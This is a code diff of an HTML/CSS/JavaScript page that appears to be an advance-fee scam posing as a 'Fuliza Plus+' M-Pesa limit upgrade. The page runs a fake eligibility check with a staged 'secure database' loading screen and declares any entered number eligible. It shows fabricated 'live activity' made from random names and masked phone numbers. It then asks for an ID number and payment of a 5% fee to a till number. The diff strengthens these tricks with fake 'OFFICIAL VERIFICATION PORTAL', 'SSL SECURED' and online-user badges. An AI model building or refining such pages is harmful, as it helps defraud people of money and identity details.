@@ -16,7 +16,7 @@ body{
 .hidden{display:none}
 
 /* CENTER */
-.center{
+.center-screen{
   display:flex;
   justify-content:center;
   align-items:center;
@@ -25,13 +25,13 @@ body{
 
 /* CARD */
 .card{
+  background:#fff;
   width:90%;
   max-width:350px;
-  background:#fff;
-  padding:25px;
+  padding:30px;
   border-radius:25px;
   text-align:center;
-  box-shadow:0 10px 25px rgba(0,0,0,0.1);
+  box-shadow:0 10px 30px rgba(0,0,0,0.1);
 }
 
 /* INPUT */
@@ -41,18 +41,34 @@ body{
   border-radius:12px;
   border:1px solid #ddd;
   margin:15px 0;
-  font-size:16px;
 }
 
 /* BUTTON */
-.btn{
+button{
   width:100%;
-  padding:14px;
+  padding:15px;
   border:none;
-  border-radius:14px;
-  background:#22c55e;
-  color:#fff;
+  border-radius:12px;
   font-size:16px;
+}
+
+.green-btn{
+  background:#16a34a;
+  color:#fff;
+}
+
+/* ICON CIRCLE */
+.icon-circle{
+  width:90px;
+  height:90px;
+  background:#e6f4ea;
+  border-radius:50%;
+  margin:0 auto 15px;
+  display:flex;
+  align-items:center;
+  justify-content:center;
+  font-size:30px;
+  color:#16a34a;
 }
 
 /* LOADING */
@@ -60,34 +76,39 @@ body{
   width:60px;
   height:60px;
   border:5px solid #e6f4ea;
-  border-top:5px solid #22c55e;
+  border-top:5px solid #16a34a;
   border-radius:50%;
   margin:0 auto 20px;
   animation:spin 1s linear infinite;
 }
-@keyframes spin{100%{transform:rotate(360deg)}}
+
+@keyframes spin{
+  100%{transform:rotate(360deg)}
+}
 
 /* SUCCESS */
 .check{
   width:80px;
   height:80px;
-  background:#22c55e;
-  border-radius:50%;
+  background:#16a34a;
   color:#fff;
-  font-size:30px;
+  border-radius:50%;
   display:flex;
   align-items:center;
   justify-content:center;
+  font-size:30px;
   margin:0 auto 20px;
 }
 
 /* LIMITS */
-.container{padding:20px}
+.container{
+  padding:20px;
+}
 
 .grid{
   display:grid;
   grid-template-columns:1fr 1fr;
-  gap:10px;
+  gap:12px;
 }
 
 .box{
@@ -96,28 +117,36 @@ body{
   border-radius:15px;
   text-align:center;
   border:2px solid transparent;
+  cursor:pointer;
 }
 
 .box.active{
-  border:2px solid #22c55e;
+  border:2px solid #16a34a;
   background:#e6f4ea;
 }
 
+/* LIVE ACTIVITY */
 .live{
-  background:#e6f4ea;
-  padding:10px;
-  border-radius:10px;
+  background:#f1f5f9;
+  padding:12px;
+  border-radius:12px;
+  margin-bottom:15px;
   font-size:13px;
-  margin-bottom:10px;
+  color:#16a34a;
+  font-weight:500;
 }
 
+/* UPGRADE BTN */
 #upgradeBtn{
   margin-top:20px;
   background:#16a34a;
   color:#fff;
   opacity:0.5;
 }
-#upgradeBtn.active{opacity:1}
+
+#upgradeBtn.active{
+  opacity:1;
+}
 
 /* MODAL */
 .modal{
@@ -128,8 +157,8 @@ body{
   height:100%;
   background:rgba(0,0,0,0.4);
   display:flex;
-  justify-content:center;
   align-items:center;
+  justify-content:center;
 }
 
 .modal-card{
@@ -146,12 +175,15 @@ body{
   padding:20px;
 }
 
-.modal-body{padding:20px}
+.modal-body{
+  padding:20px;
+}
 
 .info{
   background:#e6f4ea;
-  padding:10px;
+  padding:12px;
   border-radius:10px;
+  font-size:13px;
   margin-bottom:10px;
 }
 
@@ -160,73 +192,95 @@ body{
   gap:10px;
 }
 
-.cancel{background:#eee}
-.pay{background:#22c55e;color:#fff}
+.cancel{
+  background:#eee;
+}
 
+.pay{
+  background:#22c55e;
+  color:#fff;
+}
 </style>
 </head>
 
 <body>
 
 <!-- STEP 1 -->
-<div id="step1" class="center">
+<div id="step1" class="center-screen">
   <div class="card">
+
+    <div class="icon-circle">👤</div>
+
     <h2>Fuliza Plus+</h2>
-    <p>Verify your identity to unlock higher limits</p>
+    <p style="color:#16a34a;font-size:13px;">OFFICIAL VERIFICATION PORTAL</p>
+
+    <p>Verify your identity to unlock higher daily transaction limits.</p>
 
     <input id="phone" class="input" placeholder="Enter M-Pesa Number">
 
-    <button class="btn" onclick="start()">Check My Eligibility</button>
+    <button class="green-btn" onclick="startProcess()">
+      Check My Eligibility
+    </button>
+
+    <p style="font-size:12px;margin-top:10px;color:#888;">
+      ● 136 USERS ONLINE | 🔒 SSL SECURED
+    </p>
+
   </div>
 </div>
 
-<!-- STEP 2-5 -->
-<div id="step2" class="center hidden">
+<!-- STEP 2 -->
+<div id="step2" class="center-screen hidden">
   <div class="card">
     <div class="spinner"></div>
-    <h3 id="loadingText">Connecting...</h3>
+    <h2 id="loadingText">Connecting...</h2>
     <p>Accessing secure databases...</p>
   </div>
 </div>
 
-<!-- STEP 6 -->
-<div id="step6" class="center hidden">
+<!-- STEP 3 (SUCCESS) -->
+<div id="step3" class="center-screen hidden">
   <div class="card">
     <div class="check">✔</div>
     <h2>Congratulations!</h2>
-    <p id="userNumber"></p>
+    <p>High Trust Score Detected. <b id="userNumber"></b></p>
 
-    <button class="btn" onclick="showLimits()">
+    <button class="green-btn" onclick="showLimits()">
       Proceed to Upgrade Limit
     </button>
   </div>
 </div>
 
-<!-- STEP 7 -->
+<!-- LIMITS -->
 <div id="limits" class="container hidden">
 
-  <div id="live" class="live"></div>
+  <div id="liveActivity" class="live"></div>
 
   <h3>Select Your New Approved Limit</h3>
 
   <div class="grid">
-    <div class="box" data="3000">Ksh 3,000</div>
-    <div class="box" data="5000">Ksh 5,000</div>
-    <div class="box" data="7500">Ksh 7,500</div>
-    <div class="box" data="10000">Ksh 10,000</div>
-    <div class="box" data="21000">Ksh 21,000</div>
-    <div class="box" data="30000">Ksh 30,000</div>
-    <div class="box" data="45000">Ksh 45,000</div>
-    <div class="box" data="60000">Ksh 60,000</div>
-    <div class="box" data="70000">Ksh 70,000</div>
+    <div class="box" data-amount="3000">Ksh 3,000</div>
+    <div class="box" data-amount="5000">Ksh 5,000</div>
+    <div class="box" data-amount="7500">Ksh 7,500</div>
+    <div class="box" data-amount="10000">Ksh 10,000</div>
+    <div class="box" data-amount="12500">Ksh 12,500</div>
+    <div class="box" data-amount="16000">Ksh 16,000</div>
+    <div class="box" data-amount="21000">Ksh 21,000</div>
+    <div class="box" data-amount="25500">Ksh 25,500</div>
+    <div class="box" data-amount="30000">Ksh 30,000</div>
+    <div class="box" data-amount="35000">Ksh 35,000</div>
+    <div class="box" data-amount="45000">Ksh 45,000</div>
+    <div class="box" data-amount="60000">Ksh 60,000</div>
+    <div class="box" data-amount="70000">Ksh 70,000</div>
   </div>
 
-  <button id="upgradeBtn" disabled onclick="openModal()">
+  <button id="upgradeBtn" onclick="upgrade()" disabled>
     ⚡ UPGRADE
   </button>
+
 </div>
 
-<!-- STEP 8 MODAL -->
+<!-- MODAL -->
 <div id="modal" class="modal hidden">
   <div class="modal-card">
 
@@ -238,7 +292,7 @@ body{
     <div class="modal-body">
 
       <div class="info">
-        Pay to Till Number <b>6363781</b>
+        Pay to Till Number <b>6363781</b> to proceed.
       </div>
 
       <input class="input" placeholder="ID Number">
@@ -250,15 +304,16 @@ body{
       </div>
 
     </div>
+
   </div>
 </div>
 
 <script>
 
 /* STEP FLOW */
-function start(){
+function startProcess(){
   let phone=document.getElementById("phone").value;
-  if(!phone) return alert("Enter number");
+  if(!phone) return alert("Enter phone number");
 
   document.getElementById("step1").classList.add("hidden");
   document.getElementById("step2").classList.remove("hidden");
@@ -278,63 +333,72 @@ function start(){
 
     if(i===steps.length){
       clearInterval(interval);
+
       setTimeout(()=>{
         document.getElementById("step2").classList.add("hidden");
-        document.getElementById("step6").classList.remove("hidden");
-        document.getElementById("userNumber").innerText=phone+" is eligible";
+        document.getElementById("step3").classList.remove("hidden");
+        document.getElementById("userNumber").innerText=phone;
       },1000);
     }
   },2000);
 }
 
-/* LIMIT SCREEN */
 function showLimits(){
-  document.getElementById("step6").classList.add("hidden");
+  document.getElementById("step3").classList.add("hidden");
   document.getElementById("limits").classList.remove("hidden");
 }
 
 /* LIVE ACTIVITY */
-let msgs=[
- "Brian boosted to Ksh 21,000",
- "Mercy boosted to Ksh 10,000",
- "Kevin boosted to Ksh 45,000"
-];
-let i=0;
+let names=["Brian O.","Mercy W.","Kevin K.","Alice M.","David N."];
+let amounts=[3000,5000,7500,10000,21000,45000,70000];
+
+function randomPhone(){
+  return "07"+Math.floor(100+Math.random()*900)+"****"+Math.floor(10+Math.random()*90);
+}
+
+function generateActivity(){
+  let name=names[Math.floor(Math.random()*names.length)];
+  let amount=amounts[Math.floor(Math.random()*amounts.length)];
+  let phone=randomPhone();
+
+  return `${name} (${phone}) boosted to Ksh ${amount.toLocaleString()} just now`;
+}
 
 setInterval(()=>{
-  document.getElementById("live").innerText=msgs[i];
-  i=(i+1)%msgs.length;
-},2500);
+  document.getElementById("liveActivity").innerText=generateActivity();
+},2000);
 
 /* SELECT */
-let selected=0;
+let selectedAmount="";
+let boxes=document.querySelectorAll(".box");
 
-document.querySelectorAll(".box").forEach(b=>{
-  b.onclick=()=>{
-    document.querySelectorAll(".box").forEach(x=>x.classList.remove("active"));
-    b.classList.add("active");
+boxes.forEach(box=>{
+  box.onclick=()=>{
+    boxes.forEach(b=>b.classList.remove("active"));
+    box.classList.add("active");
 
-    selected=b.getAttribute("data");
+    selectedAmount=box.dataset.amount;
 
     let btn=document.getElementById("upgradeBtn");
     btn.disabled=false;
     btn.classList.add("active");
-    btn.innerText="⚡ UPGRADE TO KSH "+Number(selected).toLocaleString();
+
+    btn.innerText="⚡ UPGRADE TO KSH "+Number(selectedAmount).toLocaleString();
   }
 });
 
 /* MODAL */
-function openModal(){
-  document.getElementById("modal").classList.remove("hidden");
-
+function upgrade(){
   document.getElementById("modalTitle").innerText=
-   "Limit will be boosted to Ksh "+Number(selected).toLocaleString();
+   "Limit will be boosted to Ksh "+Number(selectedAmount).toLocaleString();
 
   document.getElementById("payBtn").innerText=
-   "Pay Ksh "+Math.floor(selected*0.05);
+   "Pay Ksh "+Math.floor(selectedAmount*0.05);
 
   document.getElementById("modalPhone").value=
    document.getElementById("phone").value;
+
+  document.getElementById("modal").classList.remove("hidden");
 }
 
 function closeModal(){
